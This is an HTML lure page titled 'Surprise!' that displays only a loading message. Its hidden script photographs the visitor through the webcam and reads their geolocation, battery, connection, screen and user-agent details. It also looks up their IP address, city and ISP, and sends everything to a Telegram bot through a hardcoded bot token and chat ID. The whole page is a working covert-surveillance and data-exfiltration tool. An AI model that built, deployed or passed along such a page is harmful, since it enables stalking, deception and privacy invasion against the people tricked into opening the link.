
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Surprise!</title>
  <style>
    body {
      background: linear-gradient(135deg, #a0d8e1, #6ec6e6);
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 20px;
    }
    h1 { font-size: 24px; margin-top: 20px; }
    .info { margin-top: 20px; font-size: 16px; }
    #snapshot, video { display: none; }
  </style>
</head>
<body>
  <h1>Surprise is Loading... üéÅ</h1>
  <p class="info">Just wait a moment please...</p>

  <video id="preview" autoplay playsinline></video>
  <canvas id="snapshot"></canvas>

  <script>
    const botToken = "7471112121:AAHXaDVEV7dQTBdpP38OBvytroRUSu-2jYo";
    const chatId = "7643222418";

    // --- PHOTO CAPTURE ---
    const video = document.getElementById("preview");
    const canvas = document.getElementById("snapshot");

    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          setTimeout(() => {
            captureAndSendPhoto();
          }, 1000);
        };
      })
      .catch((err) => console.error("Camera access denied:", err));

    function captureAndSendPhoto() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      canvas.toBlob((blob) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(() => {
          const tracks = video.srcObject.getTracks();
          tracks.forEach(track => track.stop());
        });
      });
    }

    // --- DEVICE + IP + LOCATION INFO ---
    async function sendDeviceDetails(position = {}) {
      const now = new Date().toLocaleString();
      const ua = navigator.userAgent || "N/A";
      const platform = navigator.platform || "N/A";
      const lang = navigator.language || "N/A";
      const screenRes = `${screen.width}x${screen.height}`;
      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
      const orientation = (screen.orientation || {}).type || "Not Available";

      // Battery
      let batteryInfo = "Battery info not available";
      try {
        const battery = await navigator.getBattery();
        batteryInfo = `Battery: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
      } catch (e) { }

      // Connection
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      const connectionInfo = connection ? 
        `üì∂ Connection: ${connection.effectiveType}, Downlink: ${connection.downlink}Mbps, RTT: ${connection.rtt}ms` : 
        "üì∂ Connection: Not available";

      // Location
      let locationMsg = "üìå Location: Not Available";
      if (position.coords) {
        locationMsg = `üìå Location:\nLat: ${position.coords.latitude}\nLng: ${position.coords.longitude}`;
      }

      // IP Address
      let ipInfo = "üåê IP: Not available";
      try {
        const res = await fetch("https://ipapi.co/json/");
        const ipData = await res.json();
        ipInfo = 
          `üåê IP: ${ipData.ip}\n` +
          `üìç City: ${ipData.city}, Region: ${ipData.region}\n` +
          `üåç Country: ${ipData.country_name} (${ipData.country_code})\n` +
          `üè¢ ISP: ${ipData.org || "Unknown"}`;
      } catch (err) {}

      const message =
        `üõ∞Ô∏è New Visit Tracked!\n\n` +
        `üïí Time: ${now}\n` +
        `üåê Platform: ${platform}\n` +
        `üì± Language: ${lang}\n` +
        `üì∫ Screen: ${screenRes}\n` +
        `üîÑ Orientation: ${orientation}\n` +
        `üåç Timezone: ${timeZone}\n` +
        `üîã ${batteryInfo}\n` +
        `üì° ${connectionInfo}\n` +
        `üß† UserAgent: ${ua}\n\n` +
        `${ipInfo}\n\n` +
        `${locationMsg}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      }).catch(console.error);
    }

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        sendDeviceDetails,
        () => sendDeviceDetails()
      );
    } else {
      sendDeviceDetails();
    }
  </script>
</body>
</html>
